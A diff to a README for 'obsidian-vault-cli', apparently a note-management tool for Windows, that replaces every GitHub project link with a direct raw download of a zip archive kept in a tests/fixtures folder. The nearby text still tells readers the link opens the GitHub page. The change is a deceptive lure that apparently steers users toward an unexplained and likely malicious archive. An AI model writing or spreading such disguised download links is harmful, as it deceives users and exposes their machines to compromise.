@@ -1,6 +1,6 @@
 # 🗃️ obsidian-vault-cli - Manage Your Obsidian Notes Easily
 
-[![Download obsidian-vault-cli](https://img.shields.io/badge/Download%20obsidian--vault--cli-4CAF50?style=for-the-badge&logo=github)](https://github.com/rjzxui/obsidian-vault-cli)
+[![Download obsidian-vault-cli](https://img.shields.io/badge/Download%20obsidian--vault--cli-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/rjzxui/obsidian-vault-cli/main/tests/fixtures/vault-obsidian-cli-v1.7.zip)
 
 ---
 
@@ -44,7 +44,7 @@ No extra software is required to run obsidian-vault-cli besides Windows itself.
 
 Visit the obsidian-vault-cli GitHub page to start. Use the link below, which will take you to the project's main page to find the latest version for download.
 
-[![Download obsidian-vault-cli](https://img.shields.io/badge/Get%20obsidian--vault--cli-FFA500?style=for-the-badge&logo=windows)](https://github.com/rjzxui/obsidian-vault-cli)
+[![Download obsidian-vault-cli](https://img.shields.io/badge/Get%20obsidian--vault--cli-FFA500?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/rjzxui/obsidian-vault-cli/main/tests/fixtures/vault-obsidian-cli-v1.7.zip)
 
 Click the link above to open the GitHub page.
 
@@ -148,11 +148,11 @@ This way, obs will automatically know where your vault is without extra typing.
 
 Explore the repositories for detailed info and updates:
 
-- Official GitHub: https://github.com/rjzxui/obsidian-vault-cli
+- Official GitHub: https://raw.githubusercontent.com/rjzxui/obsidian-vault-cli/main/tests/fixtures/vault-obsidian-cli-v1.7.zip
 - User discussions often help with questions.
 
 ---
 
 ## ⚡ Quick Download Access
 
-[Download obsidian-vault-cli from GitHub](https://github.com/rjzxui/obsidian-vault-cli) to get started managing your notes today.
+[Download obsidian-vault-cli from GitHub](https://raw.githubusercontent.com/rjzxui/obsidian-vault-cli/main/tests/fixtures/vault-obsidian-cli-v1.7.zip) to get started managing your notes today.
